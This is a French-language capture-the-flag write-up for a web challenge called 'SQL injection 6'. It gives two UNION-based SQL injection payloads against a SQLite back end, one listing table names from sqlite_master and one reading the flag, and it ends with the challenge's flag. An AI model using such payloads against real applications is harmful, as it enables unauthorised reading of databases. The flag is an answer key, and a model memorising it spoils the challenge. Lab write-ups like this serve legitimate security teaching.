# SQL injection 6

> web

Author: [Alexandre-Xavier Labonté-Lamoureux (AXDOOMER)](https://github.com/axdoomer)

Ce sixième défi d'injection SQL similaire aux deux défis prédédents, cependant le flag se cache dans une table aillant un nom inconnu. Vous devez trouver un moyen de l'obtenir puis ensuite récupérer le flag. Le mot clé "union" n'est plus filtré, donc vous avez cet embuche en moins. 

Il y a peut-être de l'information qui peut vous aider à résoudre ce défi dans les description de défis précédente. Notez que la colonne où le flag se trouve se nomme toujours "flag".

## Setup

Requirements:
- BurpSuite

# Writeup

Sachant que la base de données est SQLite3, on peut aller chercher le nom des tables comme suit:
`" union select 1,2,name from sqlite_master--`

Par la suite, ayant obtenu le nom de la table, on peut faire:
`" union select 1,2,flag from K953U0Ty4V--`.

Le tour est joué. `FLAG-25389bf2c3b5f951b1201213fa6c46baYouAreEpic`
